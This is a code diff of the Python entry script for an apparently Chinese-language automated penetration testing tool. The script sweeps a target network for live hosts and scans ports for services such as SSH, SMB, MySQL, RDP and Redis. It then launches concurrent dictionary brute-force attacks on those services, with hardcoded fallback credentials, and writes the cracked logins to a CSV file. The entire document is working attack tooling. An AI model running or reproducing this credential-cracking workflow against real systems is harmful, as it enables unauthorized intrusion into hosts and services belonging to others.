@@ -1,84 +1,75 @@
 #!/usr/bin/env python3
-# init.py - 自动化渗透测试工具入口
-
 import sys
 from concurrent.futures import ThreadPoolExecutor, as_completed
 from scanner import scan_tools
-from protocol_forces import get_brute_func, PROTOCOL_MAP
+from protocol_forces import PROTOCOL_MAP
 from spider_dictionary import get_dict
 from config import *
-from utils import logger, color
+from utils import log, save_result_to_csv
 
 def main():
-    print(color.cyan("===== 自动化渗透测试工具 =====\n"))
+    log("===== 自动化渗透测试工具启动 =====", "info")
 
-    # 1. 扫描 IP 存活
-    logger("开始扫描存活 IP...")
+    # 1. IP扫描
     scanner = scan_tools(TARGET_NETWORK)
-    alive_hosts = scanner.scan_ip(timeout=PING_TIMEOUT, max_workers=IP_SCAN_THREADS)
-    logger(f"发现 {len(alive_hosts)} 个存活主机")
+    alive_hosts = scanner.scan_ip(max_workers=IP_SCAN_THREADS)
+    log(f"发现 {len(alive_hosts)} 个存活主机", "info")
 
-    if not alive_hosts:
-        logger("没有存活主机，退出", level="error")
-        return
-
-    # 2. 扫描端口
-    port_list = [21, 22, 23, 25, 53, 80, 110, 443, 445, 993, 3306, 3389, 5432, 6379, 8080]
+    # 2. 端口扫描（使用常用端口列表）
+    port_list = [21, 22, 80, 443, 445, 3306, 3389, 6379, 8080, 8443]
     all_open_ports = {}
     for ip in alive_hosts:
-        logger(f"扫描 {ip} 的端口...")
         open_ports = scanner.scan_ports(ip, port_list, timeout=PORT_SCAN_TIMEOUT, max_workers=PORT_SCAN_THREADS)
         all_open_ports[ip] = open_ports
-        logger(f"{ip} 开放端口: {open_ports}")
+        log(f"{ip} 开放端口: {open_ports}", "info")
 
-    # 3. 收集需要爆破的任务
-    brute_tasks = []
+    # 3. 收集爆破任务
+    tasks = []
     for ip, ports in all_open_ports.items():
         for port in ports:
             if port in PROTOCOL_MAP:
-                brute_tasks.append((ip, port))
+                tasks.append((ip, port))
 
-    if not brute_tasks:
-        logger("没有可爆破的端口", level="warning")
+    if not tasks:
+        log("没有可爆破的端口，程序退出", "warning")
         return
 
-    logger(f"共 {len(brute_tasks)} 个爆破任务")
+    log(f"共 {len(tasks)} 个爆破任务", "info")
 
-    # 4. 并发爆破
+    # 4. 并发爆破 + 保存CSV
     with ThreadPoolExecutor(max_workers=BRUTE_THREADS) as executor:
         futures = []
-        for ip, port in brute_tasks:
-            protocol_name, brute_func = PROTOCOL_MAP[port]
-            # 获取对应的字典
-            user_dict = get_dict(protocol_name.lower())
+        for ip, port in tasks:
+            proto_name, brute_func = PROTOCOL_MAP[port]
+            # 获取字典（第一次调用会爬取）
+            user_dict = get_dict(proto_name.lower())
             pwd_dict = get_dict("default")  # 默认密码字典
 
-            if not user_dict or not pwd_dict:
-                logger(f"{protocol_name} 字典为空，跳过", level="warning")
-                continue
+            if not user_dict:
+                user_dict = ["root", "admin"]  # 兜底
+            if not pwd_dict:
+                pwd_dict = ["123456", "password", "admin"]
 
-            future = executor.submit(
-                brute_func,
-                ip,
-                port,
-                user_dict[:10],    # 先用前10个测试，可改
-                pwd_dict[:10]
-            )
-            futures.append((ip, port, protocol_name, future))
+            # 限制测试数量（演示用，实际可全量）
+            user_sample = user_dict[:20]
+            pwd_sample = pwd_dict[:20]
 
-        # 收集结果
-        for ip, port, protocol_name, future in futures:
+            future = executor.submit(brute_func, ip, port, user_sample, pwd_sample)
+            futures.append((ip, port, proto_name, future))
+
+        for ip, port, proto_name, future in futures:
             try:
                 user, pwd = future.result()
-                if user and pwd:
-                    logger(color.green(f"[+] {ip}:{port} [{protocol_name}] 爆破成功! {user}:{pwd}"))
+                if user or pwd:
+                    log(f"成功爆破 {ip}:{port} [{proto_name}] {user}:{pwd}", "success")
+                    save_result_to_csv(ip, port, proto_name, "成功", user, pwd)
                 else:
-                    logger(f"[-] {ip}:{port} [{protocol_name}] 未找到弱口令")
+                    log(f"未找到弱口令 {ip}:{port} [{proto_name}]", "warning")
+                    save_result_to_csv(ip, port, proto_name, "失败", "", "")
             except Exception as e:
-                logger(f"[!] {ip}:{port} 爆破异常: {e}", level="error")
+                log(f"爆破异常 {ip}:{port}: {e}", "error")
 
-    logger("所有任务完成")
-
+    log("所有任务完成，结果已保存到 CSV", "success")
 
 if __name__ == "__main__":
     main()
